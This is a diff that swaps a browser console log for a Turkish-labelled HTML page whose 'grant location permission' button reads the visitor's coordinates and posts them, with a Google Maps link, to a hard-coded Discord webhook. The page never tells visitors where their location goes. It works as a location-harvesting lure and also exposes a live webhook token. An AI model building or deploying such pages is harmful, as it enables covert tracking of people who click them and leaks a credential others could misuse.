@@ -1,19 +1,61 @@
-loader.js:1 
-        
-        
-       Failed to load resource: net::ERR_BLOCKED_BY_CLIENT
-uic.js?v=1.0.5:1 Uncaught ReferenceError: adngin is not defined
-    at uic_r_p (uic.js?v=1.0.5:1:56710)
-    at HTMLButtonElement.onclick (tryit.asp?filename=tryhtml_basic:747:148)
-discord.com/api/webhooks/1197143406909079603/NUuX5YJh-7FilsYGnKTcZOdaibciKTyTd8EyWpGzJk1gcKAgJtOsfcYoyqC-OttBeRj8:1 
-        
-        
-       Failed to load resource: the server responded with a status of 400 ()
-VM32:42 Konum Discord'a gönderilemedi.
-(anonymous) @ VM32:42
-tryit.asp?filename=tryhtml_basic:92 Uncaught ReferenceError: adngin is not defined
-    at browserResize (tryit.asp?filename=tryhtml_basic:92:11)
-site.webmanifest:1 
-        
-        
-       Failed to load resource: the server responded with a status of 404 ()
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Konum İzni</title>
+</head>
+<body>
+    <button onclick="getLocation()">Konum İzni Ver</button>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation);
+            } else {
+                alert("Tarayıcınız konum bilgisini desteklemiyor.");
+            }
+        }
+
+        function sendLocation(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            var mapLink = 'https://www.google.com/maps?q=' + latitude + ',' + longitude;
+
+            var locationEmbed = {
+                title: "Kullanıcının Konumu",
+                description: "Kullanıcının konum bilgisi:",
+                fields: [
+                    { name: "Latitude:", value: latitude, inline: true },
+                    { name: "Longitude:", value: longitude, inline: true },
+                    { name: "Harita Linki:", value: `[Google Maps](${mapLink})` }
+                ]
+            };
+
+            var discordWebhookUrl = 'https://discord.com/api/webhooks/1197143406909079603/NUuX5YJh-7FilsYGnKTcZOdaibciKTyTd8EyWpGzJk1gcKAgJtOsfcYoyqC-OttBeRj8'; // Discord Webhook URL'si
+
+            var payload = {
+                embeds: [locationEmbed]
+            };
+
+            fetch(discordWebhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Konum başarıyla Discord\'a gönderildi.');
+                } else {
+                    console.error('Konum Discord\'a gönderilemedi.');
+                }
+            })
+            .catch(error => {
+                console.error('Hata:', error);
+            });
+        }
+    </script>
+</body>
+</html>
